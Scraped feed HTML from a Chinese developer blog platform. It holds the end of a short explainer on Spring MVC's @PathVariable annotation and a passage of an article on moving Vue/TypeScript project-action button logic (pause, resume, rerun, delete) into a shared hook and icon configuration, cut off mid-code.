100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><code>@PathVariable</code> 是 <strong>Spring MVC 中的一个注解</strong>，用于从 <strong>URL 路径中提取变量值</strong>，并将其绑定到方法的参数上。</p>
<hr/>
<h3 data-id="heading-0">例子：</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/{id}")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<ul>
<li><code>@GetMapping("/{id}")</code> 表示这个 URL 模板中有一个路径变量 <code>{id}</code>。</li>
<li><code>@PathVariable Long id</code> 会将 URL 中的 <code>{id}</code> 部分转换为 <code>Long</code> 类型，并赋值给方法的 <code>id</code> 参数。</li>
</ul>
<hr/>
<h3 data-id="heading-1">示例说明：</h3>
<p>假设你访问的 URL 是：<br/>
<code>http://localhost:8080/123</code></p>
<p>那么：</p>
<ul>
<li>Spring 会将 <code>123</code> 提取出来。</li>
<li>将其转换为 <code>Long</code> 类型。</li>
<li>传递给 <code>index</code> 方法的 <code>id</code> 参数。</li>
</ul>
<hr/>
<h3 data-id="heading-2">扩展用法：</h3>
<ol>
<li>
<p><strong>指定变量名</strong>（如果参数名与 URL 变量名不同）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/{userId}")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable("userId")</span> Long id)</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
</li>
<li>
<p><strong>多个路径变量</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/users/{userId}/posts/{postId}")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPost</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long userId, 
                      <span class="hljs-meta">@PathVariable</span> Long postId)</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">与 <code>@RequestParam</code> 的区别：</h3>
<ul>
<li><code>@PathVariable</code> 是从 <strong>URL 路径</strong>中获取值（如 <code>/users/123</code>）。</li>
<li><code>@RequestParam</code> 是从 <strong>查询参数</strong>中获取值（如 <code>/users?id=123</code>）。</li>
</ul>
<hr/>
<h3 data-id="heading-4">简单总结：</h3>
<p><code>@PathVariable</code> 用于将 URL 中的占位符（如 <code>{id}</code>）映射到方法参数，是构建 RESTful API 时常用的注解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从组件点击事件到业务统一入口：一次前端操作链的完整解耦实践]]></title>    <link>https://juejin.cn/post/7581470169840779302</link>    <guid>https://juejin.cn/post/7581470169840779302</guid>    <pubDate>2025-12-09T05:48:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581470169840779302" data-draft-id="7581545175508451380" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从组件点击事件到业务统一入口：一次前端操作链的完整解耦实践"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T05:48:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码途潇潇"/> <meta itemprop="url" content="https://juejin.cn/user/2386391857112611"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从组件点击事件到业务统一入口：一次前端操作链的完整解耦实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2386391857112611/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码途潇潇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:48:53.000Z" title="Tue Dec 09 2025 05:48:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">从组件点击事件到业务统一入口：一次前端操作链的完整解耦实践</h3>
<h2 data-id="heading-1">1.业务需求和收益点</h2>
<p>业务需求：</p>
<p>每个项目可能支持多种操作动作包括处理模型中暂停 / 恢复 / 重跑 / 删除”的地方相关的接口，每个动作按钮既要展示图标，也要执行对应的业务接口。各个组件内部都写业务导致维护成本高。</p>
<p>将项目操作动作配置化、组件化，让 UI 不再参与业务逻辑，构建统一的、可扩展的动作体系</p>
<p>收益点：</p>
<ul>
<li>收益点 ：UI 与业务逻辑彻底解耦</li>
<li>动作按钮可配置、可扩展</li>
</ul>

<ul>
<li>图标、文案、逻辑全部集中管理，易维护</li>
</ul>
<h2 data-id="heading-2">2.文件结构和调用链</h2>
<p>文件结构：</p>
<pre><code class="hljs language-arduino" lang="arduino">ProjectListView/
  ├─ components/
  │    └─ ProjectCard.vue
  │
  ├─ settings/
  │    ├─ hooks/
  │    │    └─ useProjectActions.ts   <span class="hljs-comment">//统一业务处理中心</span>
  │    │
  │    └─ actionIcon.ts <span class="hljs-comment">//动作图标配置模块</span>
  │
  └─ index.vue
</code></pre>
<p>调用链：</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/554075a30f804ae5bbb92b2c429d8632~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765864148&amp;x-signature=fRVOLGqWKDArczTfWjL8C8lJIp8%3D" width="20%" alt="" loading="lazy"/>
<h2 data-id="heading-3">2.原始代码部分示例</h2>
<p>原始代码部分示例（4 个操作函数）：</p>
<p>ProjectListView/index.vue</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 处理暂停图标点击（切换显示三个操作图标）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePauseClick</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">project: ProjectListItem</span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">pauseTrain</span>({ <span class="hljs-attr">projectId</span>: project.<span class="hljs-property">projectId</span> })
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'建图已暂停'</span>)
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">getProjectList</span>()
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'暂停失败'</span>)
    }
  } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'暂停训练失败:'</span>, error)
    <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'暂停训练失败'</span>
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
  }
}
​
<span class="hljs-comment">// 处理恢复图标点击（恢复为只显示暂停图标的状态）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResumeClick</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">projectId: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">resumeTrain</span>({ projectId })
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'项目已恢复建图'</span>)
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">getProjectList</span>()
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'恢复失败'</span>)
    }
  } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'恢复训练失败:'</span>, error)
    <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'恢复训练失败'</span>
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
  }
}
​
<span class="hljs-comment">// 处理重跑图标点击</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRerunClick</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">projectId: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">restartTrain</span>({ projectId })
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'项目已开始重跑'</span>)
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">getProjectList</span>()
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'重跑失败'</span>)
    }
  } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'重跑项目失败:'</span>, error)
    <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'重跑项目失败'</span>
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
  }
}
​
<span class="hljs-comment">// 处理删除图标点击</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDeleteClick</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">projectId: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(删除后，项目数据不可恢复, <span class="hljs-string">'确认删除该项目？'</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">'确定'</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">'取消'</span>,
      <span class="hljs-attr">closeOnClickModal</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">customClass</span>: <span class="hljs-string">'tenant-confirm-messagebox'</span>,
    })
​
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">deleteProject</span>({ projectId })
      <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'删除成功'</span>)
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">getProjectList</span>()
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'删除失败'</span>)
      }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'删除项目失败:'</span>, error)
      <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'删除项目失败'</span>
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
    }
  } 
}
</code></pre>
<p>简单概述一下这个代码：</p>
<blockquote>
<p>参数名叫 project，他的类型设置为 ProjectListItem（写在 types 文件夹中）</p>
<p>const response = await ProjectService.pauseTrain({ projectId: project.projectId })</p>
<p>{ projectId: project.projectId }是对象字面量中的[键：值]写法，传过去的数据是{projectId:123456}</p>
<p>const response = await ProjectService.deleteProject({ projectId })</p>
<p>{ projectId }是一种简写的写法，{ projectId: projectId}可以直接写成{ projectId }</p>
<p>API 层中的</p>
<pre><code class="hljs language-csharp" lang="csharp"> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title">pauseTrain</span>(<span class="hljs-params"><span class="hljs-keyword">params</span>: PauseTrainParams</span>): Promise&lt;PauseTrainResponse&gt;</span> {
    <span class="hljs-keyword">const</span> { projectId } = <span class="hljs-keyword">params</span>
</code></pre>
<p>const { projectId } = params 为解构写法，如果 params 中存在一个叫 projectId 的值，拿出来变成一个新的同名变量，然后再使用</p>
</blockquote>
<h2 data-id="heading-4">3.统一动作处理逻辑的封装与使用</h2>
<p>在 ProjectListView/settings/hooks,创建 useProjectActions.ts，抽出逻辑</p>
<h3 data-id="heading-5">3.1 封装后的使用方式</h3>
<blockquote>
<p>先看封装后，怎么用，在看怎么封装</p>
</blockquote>
<p>1.接入</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> {
  getStateUIConfig,
  <span class="hljs-variable constant_">PROJECT_TYPE_MENU_LIST</span>,
  <span class="hljs-variable constant_">PROJECT_TYPE_MAP</span>,
  createActionIconConfig,
  useProjectActions,
  useUrlSync,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'./settings/index'</span>
</code></pre>
<p>对应的 hook 统一有 index 管理，所以这么接入</p>
<p>2.将 hook 所需要的函数（刷新列表函数），传给他</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 项目操作处理</span>
<span class="hljs-keyword">const</span> { handleAction } = <span class="hljs-title function_ invoke__">useProjectActions</span>({
  <span class="hljs-attr">refreshProjectList</span>: getProjectList,
})
</code></pre>
<p>这行代码本身是一个完全独立的“初始化”步骤，把getProjectList 传给hook，跟后面给 hook 传 id 啥的不在一条线上。</p>
<p>3.将handleAction 传给动作配置项</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 操作图标配置</span>
const actionIconConfig = <span class="hljs-built_in">createActionIconConfig</span>(handleAction)
</code></pre>
<blockquote>
<p>这里的逻辑是，文件 A 中导入了 B，把 B 传给了 C，在 C 中调用 B</p>
</blockquote>
<p>4.在模版中使用该配置</p>
<pre><code class="hljs language-ruby" lang="ruby">&lt;<span class="hljs-title class_">ProjectCard</span>
            <span class="hljs-symbol">:action-icon-config=<span class="hljs-string">"actionIconConfig"</span></span>
          /&gt;
</code></pre>
<p>在父组件中把这个配置单传给子组件，子组件来进行具体的使用。</p>
<h3 data-id="heading-6">3.2 封装实现细节</h3>
<p>actionIcon.ts 文件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Component</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ProjectListItem</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types/project'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">PauseIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/HomePauseIcon.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ResumeIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/ResumeIcon.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">DeleteIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/DeleteIcon.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">RerunIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/RerunIcon.vue'</span>
​
<span class="hljs-comment">//字符串枚举</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ActionIconType</span> = <span class="hljs-string">'pause'</span> | <span class="hljs-string">'resume'</span> | <span class="hljs-string">'delete'</span> | <span class="hljs-string">'rerun'</span>
​
<span class="hljs-comment">//动作-图标映射</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ACTION_ICON_COMPONENTS</span> = {
  <span class="hljs-attr">pause</span>: <span class="hljs-title class_">PauseIcon</span>,
  <span class="hljs-attr">resume</span>: <span class="hljs-title class_">ResumeIcon</span>,
  <span class="hljs-attr">delete</span>: <span class="hljs-title class_">DeleteIcon</span>,
  <span class="hljs-attr">rerun</span>: <span class="hljs-title class_">RerunIcon</span>,
} <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
​
<span class="hljs-comment">//一个操作图标，需要的所有配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ActionIconConfig</span> {
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">Component</span>
  <span class="hljs-attr">tooltip</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">project: ProjectListItem</span>) =&gt;</span> <span class="hljs-built_in">void</span>
}
​
<span class="hljs-comment">// 统一的操作处理函数的类型</span>
